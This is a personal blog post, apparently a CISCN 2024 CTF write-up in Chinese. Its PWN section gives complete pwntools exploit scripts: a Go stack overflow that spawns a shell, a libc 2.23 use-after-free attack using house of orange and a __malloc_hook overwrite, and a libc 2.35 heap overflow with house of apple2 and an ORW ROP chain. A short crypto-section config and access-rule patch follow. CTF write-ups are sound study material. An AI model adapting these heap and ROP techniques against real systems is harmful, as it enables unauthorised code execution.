---
title: "CISCN_2024"
date: 2024-05-20T12:22:41+08:00
lastmod: 2024-05-20T12:22:41+08:00
author: ["Y4ng"]

keywords: 
- PWN
- writeups
- ctf
categories: 
- writeups
tags: 
- PWN
- writeups
- ctf

description: "俺是弱🐔PWN手" # 文章描述，与搜索优化相关
summary: "" # 文章简单描述，会展示在主页
weight: 1 # 输入1可以顶置文章，用来给文章展示排序，不填就默认按时间排序
slug: ""
draft: false # 是否为草稿
comments: true
showToc: true # 显示目录
TocOpen: true # 自动展开目录
autonumbering: true # 目录自动编号
hidemeta: false # 是否隐藏文章的元信息，如发布日期、作者等
disableShare: true # 底部不显示分享栏
searchHidden: false # 该页面可以被搜索到
showbreadcrumbs: true #顶部显示当前路径
mermaid: true
cover:
    image: ""
    caption: ""
    alt: ""
    relative: false
---
# PWN



## gostack

### 题目简介

libc: 2.35

exploit point: stack overflow

golang编写的一道栈题，有一个无限制的输入，通过gdb动调找出偏移量，覆盖ret地址为main_main2，开启一个bash


### exp

~~~python
from pwn import *
binary_path = './gostack'
libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
context(arch="amd64",os="linux",log_level="debug")
elf = ELF(binary_path)
libc = ELF(libc_path)

p=remote('8.147.128.251',30914)
leak_addr = lambda name,addr: log.success(f'{name}----->'+hex(addr))
main_arena_offset = libc.symbols["__malloc_hook"] + 0x10
#global_max_fast_offset = 0x3c67f8
#free_hook_offset = libc.symbols["__free_hook"]
def debug():
    gdb.attach(p)
    pause()
    
def pwn():
    payload = b"a"*256 + p64(0X4a05a0) + p64(101)
    payload = payload.ljust(464,b"a") + p64(0X4a05a0)
    #print(payload)
    p.sendline(payload)
    p.interactive()
    
if __name__ == "__main__":
    pwn()

~~~

## orange_cat_diary

### 题目简介

libc: 2.23

exploit point: UAF

传统菜单堆题，libc2.23，UAF漏洞，有一次free和一次show，我们又要泄露libc又要打一次UAF，明显一次free是不够的，所以选择打一次house of orange（呼应上了），然后UAF打malloc_hook

~~~python
from pwn import *
binary_path = './orange_cat_diary'
libc_path = "./libc.so.6"
context(arch="amd64",os="linux",log_level="debug")

elf = ELF(binary_path)
libc = ELF(libc_path)
argv = f''
#p=process(argv=[binary_path, argv])
p=remote('8.147.129.254',12519)
leak_addr = lambda name,addr: log.success(f'{name}----->'+hex(addr))
main_arena_offset = libc.symbols["__malloc_hook"] + 0x10

def debug():
    gdb.attach(p)
    pause()
def cmd(idx):
    p.sendlineafter(b"Please input your choice:",str(idx))

def add(size,content):
    cmd(1)
    p.sendlineafter(b"Please input the length of the diary content:",str(size))
    p.sendlineafter(b"Please enter the diary content:",content)

def show():
    cmd(2)

def free():
    cmd(3)

def edit(size,content):
    cmd(4)
    p.sendlineafter(b"Please input the length of the diary content:",str(size))
    p.sendlineafter(b"Please enter the diary content:\n",content)

def welcome(name):
    p.sendlineafter(b"Hello, I'm delighted to meet you. Please tell me your name.\n",name)
def pwn():
    #debug()
    welcome(b"y4ng")
    add(0x18,b"aaaa")
    edit(0x20,b"b"*0x18+b"\xE1\x0f\x00\x00\x00\x00\x00\x00")
    add(0x1000,b"y4ng")
    add(0x60,b"")
    show()
    libc_addr = u64(p.recv(6).ljust(8,b"\x00"))-0x3c510a
    leak_addr("libc_addr",libc_addr )
    malloc_hook = libc_addr + libc.sym["__malloc_hook"]-0x23
    one = libc_addr+0xf03a4
    free()
    edit(0x10,p64(malloc_hook))
    add(0x60,b"a")
    add(0x60,b"a"*0x13+p64(one))
    cmd(1)
    p.sendlineafter(b"Please input the length of the diary content:",str(0x20))
    p.interactive()
if __name__ == "__main__":
    pwn()

~~~



## ezheap

怎么是用seccomp开的沙箱啊，下次记得用prctl才不会有这么多释放的heap内存，推荐文章[seccomp沙箱](https://www.anquanke.com/post/id/208364#h2-2)

![heap memory](ezheap1.png)

### 题目简介

libc: 2.35

exploit point: heap overflow

借助空间中现存的heap，泄露出libc和heap地址，然后打house of apple2

### 漏洞利用
先分配一个size`0x60`的把tcache bin消耗空，然后从unsorted bin上分割一个size`0x60`的heap，用来泄漏libc
![heap layout](image2.png)

分配到small bin上面`0x30`size的heap，泄漏出堆块地址
![heap layout](image3.png)

### exp

```python
from pwn import *
binary_path = './EzHeap'
libc_path = "./libc.so.6"
context(arch="amd64",os="linux",log_level="debug")

elf = ELF(binary_path)
libc = ELF(libc_path)
argv = f''
p=process(argv=[binary_path, argv])
#p=remote('8.147.129.121',15268)
leak_addr = lambda name,addr: log.success(f'{name}----->'+hex(addr))
main_arena_offset = libc.symbols["__malloc_hook"] + 0x10
#global_max_fast_offset = 0x3c67f8
#free_hook_offset = libc.symbols["__free_hook"]

def debug():
    gdb.attach(p,"b _IO_wdoallocbuf")
    pause()
def cmd(idx):
    p.sendlineafter(b"choice >> ",str(idx))

def add(size,content):
    cmd(1)
    p.sendlineafter(b"size:",str(size))
    p.sendlineafter(b"content:",content)

def free(idx_):
    cmd(2)
    p.sendlineafter(b"idx",str(idx_))

def edit(idx,size,content):
    cmd(3)
    p.sendlineafter(b"idx",str(idx))
    p.sendlineafter(b"size:",str(size))
    p.sendlineafter(b"content:",content)

def show(idx):
    cmd(4)
    p.sendlineafter(b"idx",str(idx))
    p.recvuntil(b"content:")
    
def pwn():
    add(0x50,b"y4ng") #0
    add(0x50,b"y4ng") #1
    edit(1,0x60,b"a"*8*12)
    show(1)
    p.recvuntil(b"a"*8*12)
    libc_addr  = u64(p.recv(6).ljust(8,b"\x00")) - 0x21ace0
    leak_addr("libc_addr",libc_addr)
    edit(1,0x60,b"a"*8*11+p64(0x90))
    for i in range(7):
        add(0x30,b"y4ng") #2-8
    add(0x30,b"y4ng") #9
    add(0x30,b"y4ng") #10
    edit(10,0x41,b"a"*8*8+b"a")
    show(10)
    p.recvuntil(b"a"*8*8)
    heap_base  = u64(p.recv(6).ljust(8,b"\x00"))- 0x61
    edit(10,0x48,b"a"*8*6+p64(0)+p64(0xf1)+p64(heap_base))
    heap_base += 0x1590 
    #debug()
    pop_rdi_ret = libc_addr + 0x000000000002a3e5
    pop_rsi_ret = libc_addr + 0x000000000002be51
    pop_rsi_r15_ret = libc_addr + 0x000000000002a3e3
    pop_rdx_r12_ret = libc_addr + 0x000000000011f2e7
    pop_rax_ret = libc_addr + 0x0000000000045eb0
    magic_gadget = libc_addr + 26 + 0x16a050
    '''
    mov    rbp,QWORD PTR [rdi+0x48]
    mov    rax,QWORD PTR [rbp+0x18]
    lea    r13,[rbp+0x10]
    mov    DWORD PTR [rbp+0x10],0x0
    mov    rdi,r13
    call   QWORD PTR [rax+0x28]
    '''
    leave_ret = libc_addr + 0x000000000004da83
    syscall_ret = libc_addr + libc.sym['read'] + 0x10
    ret = libc_addr + 0x0000000000029139
    fake_IO_addr = heap_base +  0x180
    leak_addr("fake_IO_addr",fake_IO_addr)
    rop_address = fake_IO_addr + 0xe0 + 0xe8 + 0x70
    orw_rop =  b'./flag\x00\x00'
    orw_rop += p64(pop_rsi_r15_ret) + p64(0) + p64(fake_IO_addr - 0x10)
    orw_rop += p64(pop_rdi_ret) + p64(rop_address) 
    #orw_rop += p64(pop_rsi_ret) + p64(0)
    orw_rop += p64(pop_rax_ret) + p64(2)
    orw_rop += p64(syscall_ret)
    orw_rop += p64(pop_rdi_ret) + p64(3)
    orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100)
    orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0)
    orw_rop += p64(libc.sym['read']+libc_addr)
    orw_rop += p64(pop_rdi_ret) + p64(1)
    orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100)
    orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0)
    orw_rop += p64(libc.sym['write']+libc_addr)
    
    payload = p64(0) + p64(leave_ret) + p64(0) + p64(libc.sym['_IO_list_all'] - 0x20 + libc_addr)
    payload = payload.ljust(0x38, b'\x00') + p64(rop_address)
    payload = payload.ljust(0x90, b'\x00') + p64(fake_IO_addr + 0xe0)
    payload = payload.ljust(0xc8, b'\x00') + p64(libc.sym['_IO_wfile_jumps']+libc_addr)
    payload = payload.ljust(0xd0 + 0xe0, b'\x00') + p64(fake_IO_addr + 0xe0 + 0xe8)
    payload = payload.ljust(0xd0 + 0xe8 + 0x68, b'\x00') + p64(magic_gadget)
    payload += orw_rop
    leak_addr("heap_base",heap_base)
    add(0x100,b"a") # 11
    add(0x450,b"y4ng") # 12
    add(0x450,b"y4ng") # 13
    add(0x440,b"y4ng") # 14
    add(0x440,b"y4ng") # 15
    free(12)
    add(0x500,b"y4ng") # 12
    free(14)
    p1 = b"a"*0x100+p64(0)+p64(0x461)+payload
    edit(11,len(p1),p1)
    add(0x500,b"y4ng")
    add(0x440,b"y4ng") # 15
    cmd(5)
    p.interactive()
if __name__ == "__main__":
    pwn()

```







# crypto

## 工业信息

一道可信计算题，字太多了让GPT帮我读文档，根据他给的代码修改record.list和函数

### record.list

~~~txt
{
    "type": "MAC_LABEL",
    "subtype": "RECORD"
}
{
    "name": "name",
    "isleveladjust": 0,
    "isselfdefine": 1,
    "class": "",
    "level_fix": 1,
    "level_adjust": 0
}
{
    "name": "ID",
    "isleveladjust": 0,
    "isselfdefine": 1,
    "class": "",
    "level_fix": 1,
    "level_adjust": 0
}
{
    "name": "department",
    "isleveladjust": 0,
    "isselfdefine": 1,
    "class": "",
    "level_fix": 1,
    "level_adjust": 0
}
{
    "name": "position",
    "isleveladjust": 0,
    "isselfdefine": 1,
    "class": "",
    "level_fix": 1,
    "level_adjust": 0
}
{
    "name": "YOF",
    "isleveladjust": 0,
    "isselfdefine": 1,
    "class": "",
    "level_fix": 1,
    "level_adjust": 0
}
{
    "name": "salary",
    "isleveladjust": 1,
    "isselfdefine": 1,
    "class": "F",
    "level_fix": 0,
    "level_adjust": 0
}
{
    "name": "cell",
    "isleveladjust": 1,
    "isselfdefine": 0,
    "class": "",
    "level_fix": 0,
    "level_adjust": -1
}
{
    "name": "email",
    "isleveladjust": 1,
    "isselfdefine": 0,
    "class": "",
    "level_fix": 0,
    "level_adjust": -2
}

~~~

### fuction

~~~c
	// add except rule check here
	if (strcmp(record_name, "salary") == 0) {
        // 判断是否是本人查询
        if (strcmp(read_user, record_user) == 0) {
            return 1;  // 允许访问
        }
    }

~~~


<!-- more --> 
